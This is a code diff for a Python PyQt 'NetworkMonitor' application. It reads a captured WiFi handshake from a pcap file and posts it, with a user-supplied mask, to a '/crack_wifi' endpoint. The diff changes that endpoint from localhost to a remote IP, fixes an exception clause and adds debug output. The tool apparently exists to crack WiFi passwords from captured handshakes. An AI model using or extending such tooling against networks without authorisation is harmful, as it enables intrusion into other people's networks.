@@ -299,8 +299,8 @@ class NetworkMonitor(QMainWindow):
                     
                 self.last_processed_cap = latest_cap
                 
-                with open(f"{base_name}.pcap", 'rb') as f:
-                    handshake_string = f.read().hex()
+                with open(f"{base_name}.pcap", 'r') as f:
+                    handshake_string = f.read()
                 
                 # Get mask input from user
                 mask = self.get_mask_input()
@@ -323,7 +323,7 @@ class NetworkMonitor(QMainWindow):
                 try:
 
                     response = requests.post(
-                        'http://localhost:5000/crack_wifi',
+                        'http://172.31.124.39:5000/crack_wifi',
                         data=payload
                     )
                     
@@ -334,10 +334,11 @@ class NetworkMonitor(QMainWindow):
                         self.stations_list.addItem(
                             f"API Error: {response.status_code} - {response.text}"
                         )
-                except e:
+                except Exception as e:
                     print("Response exception:",e)
             
                 print("payload data:", payload)
+                print("response data:", response.json())
                 
                 ######
                 self.stations_list.addItem("Successfully captured handshake!")
